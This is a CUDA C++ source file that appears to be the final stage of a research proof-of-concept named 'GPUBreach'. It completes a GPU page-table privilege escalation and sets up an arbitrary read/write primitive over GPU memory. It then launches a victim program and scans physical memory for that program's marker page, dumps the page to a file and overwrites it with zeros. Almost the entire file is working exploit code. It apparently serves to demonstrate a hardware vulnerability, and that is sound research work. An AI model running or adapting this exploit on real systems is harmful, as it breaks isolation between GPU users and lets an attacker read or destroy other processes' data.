#include "./s4_secondRegion.cuh"
#include <iostream>
#include <fstream>
#include <sys/mman.h>
#include <fcntl.h>
#include <filesystem>
#include <unistd.h>
#include <iomanip>

void dump_memory(void* ptr, const std::string& filename) {
    std::ofstream ofs(filename);
    if (!ofs) {
        std::cerr << "Failed to open file\n";
        return;
    }

    uint64_t* p = reinterpret_cast<uint64_t*>(ptr);
    size_t num_rows = (2 * 1024 * 1024) / 8;  // 2MB / 8 bytes

    for (size_t i = 0; i < num_rows; i++) {
        ofs << std::hex << std::setw(16) << std::setfill('0')
            << reinterpret_cast<uintptr_t>(&p[i]) << " "
            << std::setw(16) << p[i] << "\n";
    }
}

int
main (int argc, char *argv[])
{
  if (argc <= 1)
  {
    std::cout << "Not enough arguments.\n";
    return 0;
  }

  removeFirstNArgs (argc, argv, 1);
  GPUBreachContext ctx = second_PT_region (argc, argv);
  std::cout << "GPU Privilege Escalation Finished, proceeding to setting up environment for dumping user memory..."<< '\n';

  auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
  
  struct ArbRW_Primtv prim;
  cudaMallocManaged(&prim.flush_ptr, prim.flush_size);
  cudaMallocManaged(&prim.data_device_ptr, ALLOC_SIZE);

  initialize_memory_loop<<<1,1>>>(prim.flush_ptr, prim.flush_size);
  cudaDeviceSynchronize();
  gpuErrchk(cudaPeekAtLastError());

  // Generate 64KB Pages
  prim.gen_64KB();

  // Flush TLB
  prim.flush_tlb();

  // Temporarily use our previous corrupted pointer.
  prim.pt_ptr = corrupted_ptr;
  
  // Using the 64KB arbitrary RW pointer, converting primitive to cudaMalloc, non-evictable 2MB versions.
  setup_cudaMalloc_primitive(prim, cudaMalloced_ptrs);

  std::cout << "(Stable Primitive Ready) Starting the specified program"
              << '\n';
  int status = std::system("nohup ./data_scripts/gpubreach_demo/app > ./results/gpubreach_demo/app.out 2>&1 &");

  size_t total_byte;
  auto cuda_status = cudaMemGetInfo (nullptr, &total_byte);
  if (cudaSuccess != cuda_status)
    {
      printf ("Error: cudaMemGetInfo fails, %s \n",
              cudaGetErrorString (cuda_status));
      exit (1);
    }

  // -1GB conservative limit since the last few hundreds of memory in GPU is unreadable.
  uint64_t memory_limit = total_byte - 1L * GB; 
  uint64_t it_ptr = NULL_PTE;
  for (uint64_t i = 0; i < memory_limit; i += ALLOC_SIZE)
    {
      prim.modify(it_ptr);
      prim.flush_tlb();

      cudaMemcpyArray(prim.data_device_ptr, (uint8_t*)prim.arb_rw_ptr, ALLOC_SIZE);
      DBG_OUT << i << ' '<< (void*)it_ptr << ' ' << *(void**)prim.data_device_ptr << '\n';
      if (*(void**)(prim.data_device_ptr) == (void*)0xdeadbeefabcdabcd)
      {
        std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0xdeadbeefabcdabcd << '\n';
        dump_memory(prim.data_device_ptr, "results/gpubreach_demo/memdump.txt");

        std::cout << "Finished Dumping page, writing to physical location of appto terminate."<< '\n';
        prim.modify(it_ptr);
        
        memset_ptr<<<1,1>>>((uint8_t *)prim.arb_rw_ptr, (uint64_t)0, ALLOC_SIZE);
        cudaDeviceSynchronize();

        prim.flush_tlb();
        break;
      }

      cudaDeviceSynchronize();
      gpuErrchk(cudaPeekAtLastError());
      it_ptr += 0x20000;
    }

  cudaFree(prim.flush_ptr);
  cudaFree(prim.data_device_ptr);
  cudaFree(corrupted_ptr);
  for (auto& ptr : cudaMalloced_ptrs)
    cudaFree(ptr);
  
  return 0;
}